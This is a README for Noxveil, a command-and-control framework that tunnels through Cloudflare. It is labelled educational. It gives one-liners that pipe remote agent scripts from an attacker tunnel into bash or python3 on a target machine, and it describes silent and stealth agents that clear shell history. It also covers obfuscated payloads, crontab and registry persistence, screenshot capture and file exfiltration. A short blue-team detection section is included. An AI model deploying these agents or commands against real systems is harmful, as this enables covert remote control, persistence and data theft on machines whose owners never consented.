# ⚡ Noxveil (Beta)

> ⚠️ **EDUCATIONAL PURPOSES ONLY** - Noxveil is designed for cybersecurity education and authorized research in controlled lab environments.

---

## ⚠️ Legal Disclaimer

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ⚠️  WARNING: UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL             ║
║                                                                              ║
║  This software is provided for EDUCATIONAL and RESEARCH purposes only.       ║
║  Only use in laboratory environments that you own or have explicit written   ║
║  permission to test.                                                         ║
║                                                                              ║
║  The authors and contributors assume NO liability for any misuse of this     ║
║  software. Users are solely responsible for compliance with all applicable   ║
║  laws and regulations.                                                       ║
║                                                                              ║
║  By using this software, you agree to:                                       ║
║  • Only test systems you own or have written authorization for               ║
║  • Comply with all local, state, national, and international laws            ║
║  • Use this tool responsibly and ethically                                   ║
║  • Accept full responsibility for your actions                               ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

---

## 📋 Quick Overview

| Feature | Description |
|---------|-------------|
| 🌐 **HTTP-based C2** | All agent communication uses standard HTTP/HTTPS protocols |
| 🔒 **Cloudflare Tunnel** | Automatic NAT traversal - no port forwarding required |
| 🎨 **Modern Web UI** | Responsive operator console with deploy center, audit feed, and live agent cards |
| 💻 **Server Shell** | Built-in interactive bash terminal with live PTY streaming |
| 🔐 **JWT Auth + MFA** | Secure operator authentication with optional TOTP |
| 📊 **Real-time Stats** | Live agent monitoring and statistics |

---

## 🚀 Quick Start

### Option 1: Docker (Recommended)

Start by copying the example environment file and replacing the placeholder secrets:

```bash
cp .env.example .env
```

Then edit `.env` and set at least these values before you start the stack:

```dotenv
JWT_SECRET_KEY=replace-with-openssl-rand-hex-32
AGENT_AUTH_TOKEN=replace-with-openssl-rand-hex-24
INITIAL_ADMIN_PASSWORD=change-me-now
```

Recommended secret generation:

```bash
openssl rand -hex 32   # JWT_SECRET_KEY
openssl rand -hex 24   # AGENT_AUTH_TOKEN
```

`docker compose` reads `.env` automatically. If you run Noxveil directly instead of Docker, export the same variables into your shell first.

```bash
# Build and start
docker compose up --build

# View logs (tunnel URL appears here once cloudflared is ready)
docker compose logs -f noxveil

# Stop
docker compose down
```

### Option 2: Direct Launch

```bash
# Make launcher executable
chmod +x start.sh

# Start server (auto-installs cloudflared if needed)
./start.sh

# Local mode only (no tunnel)
./start.sh --no-tunnel
```

### Option 3: Manual

```bash
# Install dependencies
cd server && pip install -r requirements.txt

# Start server
python -m server.main
```

---

## 🌐 Cloudflare Tunnel Integration

### Why Cloudflare Tunnels?

| Benefit | Description |
|---------|-------------|
| 🎯 **NAT Traversal** | No public IP or port forwarding needed |
| 💰 **Free** | Quick tunnels require no Cloudflare account |
| 🔐 **Encryption** | Traffic is HTTPS end-to-end |
| 🎭 **Domain Reputation** | `trycloudflare.com` is a legitimate Cloudflare domain |
| 🔄 **Ephemeral** | Each session gets a unique random subdomain |

### How It Works

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ATTACKER MACHINE                             │
│                                                                     │
│  ┌──────────────┐    localhost:1324    ┌──────────────────────┐     │
│  │   Noxveil    │◄──────────────────►  │  cloudflared tunnel  │     │
│  │  (FastAPI)   │                      │  --url localhost:1324│     │
│  │  port 1324   │                      │                      │     │
│  └──────┬───────┘                      └─────┬────────────────┘     │
│         │                                       │                   │
│   Web UI: http://localhost:1324                 │                   │
│   or https://<random-id>.trycloudflare.com      │                   │
└─────────────────────────────────────────────────┼───────────────────┘
                                                  │ HTTPS (cloudflare)
                                                  │
                                    ┌─────────────▼──────────────┐
                                    │       TARGET MACHINE       │
                                    │                            │
                                    │  agent.py                  │
                                    │  C2_URL = https://<id>     │
                                    │    .trycloudflare.com      │
                                    │                            │
                                    │  Polls /api/v1/tasks/{id}  │
                                    │  Posts /api/v1/results     │
                                    └────────────────────────────┘
```

---

## 🎮 Web Interface

### Access Points

| Mode | URL |
|------|-----|
| Local | http://localhost:1324 |
| Tunnel | https://\<random\>.trycloudflare.com |

### Initial Admin Credentials

```
Username: admin
Password: changemeplease (comes from INITIAL_ADMIN_PASSWORD or data/initial_admin_password.txt)
```

> 🔒 The bootstrap password is generated or injected at startup. After first login, use Account security to enable MFA.

### Features

#### 📊 Dashboard
- Real-time agent statistics
- Signed deploy links for Python, obfuscated Python, and Bash payloads
- Modern managed-agent card layout with live/offline state
- Quick command fan-out to selected agents
- Account security with MFA status and setup flow
- Audit feed for operator and deployment activity

#### 💻 Server Shell
- Direct interactive shell on the Noxveil server
- WebSocket-based PTY streaming with live output
- Password-safe input mode for sudo/passphrase prompts
- Connection state and Ctrl+C support

#### 🎯 Agent Terminal
- Live per-agent command workspace
- File upload/download artifact panel
- Screenshot preview and save flow
- Sleep/persist/info shortcuts with structured UI

---

## 🤖 Agent Deployment

### Get Tunnel URL

After starting the server, note the tunnel URL from output:

```
╔══════════════════════════════════════════════════════════════════════╗
║   🌐 Tunnel URL:   https://blue-castle-mighty-a1b2.trycloudflare.com ║
╚══════════════════════════════════════════════════════════════════════╝
```

Or access the **Web UI** dashboard to get fresh signed deploy links for Python, obfuscated Python, and Bash agents.

---

## 🎯 Quick Start Modes

### Mode 1: Web UI Dashboard (Recommended for beginners)

```bash
# Start server with web UI
python -m server.main

# Access at http://localhost:1324
# Login: admin / (password from data/initial_admin_password.txt)
```

### Mode 2: Interactive Commander

```bash
# Start in interactive mode
python -m server.main --interactive

# Wait for tunnel, then use a signed stage URL from the dashboard:
curl -s "https://your-tunnel.trycloudflare.com/api/v1/stage?stager=<signed-token>" | bash
```

This gives you a **real-time interactive shell** with colored output:
```
shell> whoami
shell> cat /etc/passwd
shell> cd /tmp
shell> exit
```

---

## Agent Types

### Method 1: Python Agent (Recommended)

**One-liner:**
```bash
curl -s "https://your-tunnel.trycloudflare.com/api/v1/payload/agent.py?stager=<signed-token>" | python3 -
```

**Download and run:**
```bash
# Download from Web UI or use a fresh signed URL:
curl -o agent.py "https://your-tunnel.trycloudflare.com/api/v1/payload/agent.py?stager=<signed-token>"
python3 agent.py
```

**Features:**
- ✅ Pure Python - no external dependencies
- ✅ Cross-platform (Linux, macOS, Windows)
- ✅ Screenshot capture
- ✅ File download/upload
- ✅ Persistence mechanisms
- ✅ Configurable callback intervals

### Method 3: Stealth Bash Agent

**One-liner:**
```bash
curl -s "https://your-tunnel.trycloudflare.com/api/v1/stage?stager=<signed-token>" | bash
```

**Silent mode:**
```bash
curl -s "https://your-tunnel.trycloudflare.com/api/v1/stage?stager=<signed-token>" | bash -s -- -s
```

**Features:**
- ✅ Long-polling for commands (30s timeout)
- ✅ Automatic cleanup on exit
- ✅ History clearing
- ✅ cd/export command handling
- ✅ Maximum output size limit (64KB)
- ✅ Failure tolerance (10 failed polls before exit)
- ✅ Silent mode (-s flag)

### Agent Comparison

**One-liner:**
```bash
curl -s "https://your-tunnel.trycloudflare.com/api/v1/payload/agent.sh?stager=<signed-token>" | bash
```

**Download and run:**
```bash
curl -o agent.sh "https://your-tunnel.trycloudflare.com/api/v1/payload/agent.sh?stager=<signed-token>"
chmod +x agent.sh
./agent.sh
```

**Features:**
- ✅ Pure Bash - works on any Unix-like system
- ✅ Minimal dependencies (curl, bash)
- ✅ Command execution
- ✅ System information gathering
- ✅ Lightweight footprint

### Agent Comparison

| Feature | Python Agent | Bash Agent | Stealth Bash |
|---------|--------------|------------|--------------|
| **Dependencies** | Python 3.x | Bash + curl | Bash + curl |
| **Size** | ~25 KB | ~3 KB | ~4 KB |
| **Interactive** | ❌ Polling | ❌ Polling | ✅ Long-poll |
| **Silent Mode** | ✅ `-s` | ✅ `-s` | ✅ `-s` |
| **cd Handling** | ✅ | ❌ | ✅ |
| **Cleanup** | ❌ | ❌ | ✅ |
| **Max Output** | Unlimited | Unlimited | 64 KB |
| **Failure Limit** | Unlimited | Unlimited | 10 fails |

---

## Method 4: Standard Bash Agent

```bash
# Build agent with embedded URL
python3 agent/agent_builder.py \
    --url https://your-tunnel.trycloudflare.com \
    -o /tmp/agent.py

# Deploy
python3 /tmp/agent.py
```

---

## 📡 API Endpoints

### Agent Communication

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/v1/register` | Agent registration with signed bootstrap token |
| `GET` | `/api/v1/tasks/{agent_id}` | Poll for tasks with per-agent JWT |
| `POST` | `/api/v1/results` | Submit command results with per-agent JWT |
| `GET` | `/api/v1/heartbeat/{agent_id}` | Lightweight check-in with per-agent JWT |
| `GET` | `/api/v1/payload/agent.py` | Download Python agent with signed stager query token |
| `GET` | `/api/v1/payload/agent.sh` | Download Bash agent with signed stager query token |
| `GET` | `/api/v1/stage` | Download stealth agent with signed stager query token |
| `POST` | `/api/v1/reg` | Interactive register with signed bootstrap token |
| `GET` | `/api/v1/cmd` | Get interactive command with per-agent JWT |
| `POST` | `/api/v1/out` | Submit interactive output with per-agent JWT |

### Operator API (JWT Protected)

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/v1/auth/login` | Operator login |
| `POST` | `/api/v1/auth/refresh` | Refresh access token |
| `GET` | `/api/v1/agents` | List all agents |
| `GET` | `/api/v1/agents/{id}` | Get agent details |
| `POST` | `/api/v1/agents/{id}/task` | Send command to agent |
| `DELETE` | `/api/v1/agents/{id}` | Delete an agent |
| `PATCH` | `/api/v1/agents/{id}` | Update agent notes/interval |
| `GET` | `/api/v1/stats` | Dashboard statistics |
| `GET` | `/api/v1/tunnel-info` | Get current tunnel URL |
| `GET` | `/api/v1/audit-logs` | Operator activity and security feed |
| `GET` | `/api/v1/security/status` | Current security posture |
| `POST` | `/api/v1/security/mfa/setup` | Generate MFA enrollment secret |
| `POST` | `/api/v1/security/mfa/enable` | Enable MFA for current operator |
| `POST` | `/api/v1/security/mfa/disable` | Disable MFA for current operator |

### WebSocket Endpoints

| Endpoint | Description |
|----------|-------------|
| `WS /api/v1/ws/terminal/{agent_id}` | Interactive agent terminal |
| `WS /api/v1/ws/bash` | Server bash shell |

---

## 🎯 MITRE ATT&CK Coverage

This framework demonstrates the following ATT&CK techniques:

| Technique | Name | Description |
|-----------|------|-------------|
| T1071.001 | Application Layer Protocol | HTTP-based C2 communication |
| T1059 | Command and Scripting Interpreter | Shell command execution |
| T1082 | System Information Discovery | Agent registration data |
| T1033 | System Owner/User Discovery | Username enumeration |
| T1041 | Exfiltration Over C2 Channel | Results over same channel |
| T1113 | Screen Capture | Screenshot capabilities |
| T1005 | Data from Local System | File download |
| T1547.001 | Boot/Logon Autostart | Windows registry persistence |
| T1053.003 | Scheduled Task/Job | Linux crontab persistence |

---

## 🔍 Detection Guide (Blue Team)

### Network Indicators

| Indicator | Description | Detection Tool |
|-----------|-------------|----------------|
| DNS to `*.trycloudflare.com` | Unusual in enterprise | DNS logs, Zeek |
| Periodic HTTPS beacons | Regular interval ± jitter | RITA, proxy logs |
| POST with system enum data | Agent registration | Proxy inspection |
| Python User-Agent mismatch | JA3 ≠ real browser | JA3 fingerprinting |

### Host Indicators

| Indicator | Description | Detection Tool |
|-----------|-------------|----------------|
| Python spawning shell | Unusual process tree | EDR, Sysmon |
| New crontab/registry entries | Persistence | osquery, autoruns |
| Screen capture API calls | Screenshot attempts | API monitoring |

### Detecting Beaconing

The agent polls the Noxveil server at regular intervals. This pattern is detectable:

```bash
# Example: Detect periodic requests with Zeek
zeek -r capture.pcap http-reason

# Look for regular intervals in connection logs
# Group by URI and inspect temporal patterns
```

**Tools for beaconing detection:**
- **RITA** (Real Intelligence Threat Analytics)
- **Splunk** correlation queries
- **ELK** stack with machine learning

---

## 📁 Project Structure

```
noxveil/
├── server/
│   ├── main.py              # FastAPI server entry point
│   ├── models.py            # SQLAlchemy database models
│   ├── database.py          # Async SQLite setup
│   ├── auth.py              # JWT authentication
│   ├── api_routes.py        # REST API endpoints
│   ├── ui_routes.py         # Web UI routes
│   ├── tunnel.py            # Cloudflare tunnel manager
│   └── requirements.txt     # Python dependencies
├── web-ui/
│   ├── index.html           # Dashboard
│   ├── terminal.html        # Agent terminal
│   ├── bash.html            # Server shell
│   ├── login.html           # Login page
│   ├── css/style.css        # Dark hacker theme
│   └── js/
│       ├── app.js           # Dashboard logic
│       ├── terminal.js      # WebSocket terminal
│       └── auth.js          # Token management
├── agent/
│   ├── agent.py             # Pure Python HTTP agent
│   └── agent_builder.py     # Payload generator
├── data/                    # SQLite database + tunnel URL
├── docker-compose.yml       # Docker configuration
├── start.sh                 # One-command launcher
└── README.md                # This file
```

---

## 🔐 Security Considerations

### What's Implemented ✅

- [x] JWT authentication for the web UI and WebSockets
- [x] Signed bootstrap and stager tokens plus per-agent JWT rotation
- [x] SQLite persistence with encrypted task, result, and operator-secret fields
- [x] Local encrypted secret vault for bootstrap secrets
- [x] Rate limiting on login, refresh, and deploy endpoints
- [x] Account lockout after repeated failed logins
- [x] TOTP multi-factor authentication flow
- [x] Input sanitization on operator-controlled fields
- [x] Audit logging for logins, deploy generation, MFA changes, and agent actions
- [x] Obfuscated Python payload generation
- [x] Agent-side certificate pinning support
- [x] HTTPS transport via Cloudflare tunnel

### Still Not Production Ready ⚠️

- [ ] External secret manager / KMS integration
- [ ] Centralized audit export / SIEM forwarding
- [ ] RBAC and multi-operator tenancy
- [ ] Endpoint hardening for real adversarial environments

> 🚨 This remains an educational framework for controlled lab use, not a production C2 product.

---

## 🛠️ Troubleshooting

### Agent Not Connecting

```bash
# 1. Verify tunnel URL is correct
curl -I https://your-tunnel.trycloudflare.com

# 2. Check firewall allows outbound HTTPS
# 3. Check agent logs for errors
# 4. Verify server is running
```

### Tunnel URL Keeps Changing

Each tunnel restart generates a new URL. For a stable URL:
- Keep the tunnel running continuously
- Use a named Cloudflare tunnel with a custom domain

### Port Already in Use

```bash
# Find process using port 1324
lsof -i :1324

# Kill the process
kill <PID>

# Or use a different port
./start.sh --port 8080
```

### Database Errors

```bash
# Reset database
rm -rf data/c2.db

# Restart server
docker compose restart noxveil
```

---

## 📊 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU | 1 core | 2+ cores |
| RAM | 512 MB | 1+ GB |
| Storage | 100 MB | 500 MB |
| Network | Outbound HTTPS | Unrestricted outbound |

### Supported Platforms

- **Linux** (Ubuntu, Debian, CentOS, Arch)
- **macOS** (Intel, Apple Silicon)
- **Windows** (WSL2 recommended)

---

## 📚 References

- [Cloudflare Tunnels Documentation](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [FastAPI Documentation](https://fastapi.tiangolo.com/)
- [SQLAlchemy Async](https://docs.sqlalchemy.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 📄 License

Noxveil is licensed under the **GNU Affero General Public License v3.0 or later** (`AGPL-3.0-or-later`).

See [LICENSE](/home/csoftware/lite_c2/LICENSE) for the full license text.

This project is still provided for **educational purposes only**.

By using this software, you acknowledge that:
- You have read and understood the legal disclaimer
- You accept full responsibility for your actions
- You will only use this tool in authorized environments
- You will comply with all applicable laws and regulations

---

## 👥 Credits

**Built with:**
- ⚡ FastAPI - Modern Python web framework
- 🗄️ SQLAlchemy (async) - Database ORM
- 🌩️ Cloudflare Tunnels - NAT traversal
- 🎨 Vanilla JavaScript - No framework dependencies
- 🔐 PyJWT - Token authentication
- 🔒 bcrypt - Password hashing

**docker-compose.yml:** Edited and maintained by csoftware-arigpt. Copy `.env.example` to `.env`, replace the placeholder secrets, and then start the stack with Docker Compose.

**Educational Purpose:** Noxveil is designed to help security professionals understand C2 infrastructure for defensive purposes.

---

<div align="center">

**🛡️ Use Responsibly • Stay Legal • Keep Learning**

Made for educational purposes | © 2026 csoftware-arigpt

</div>
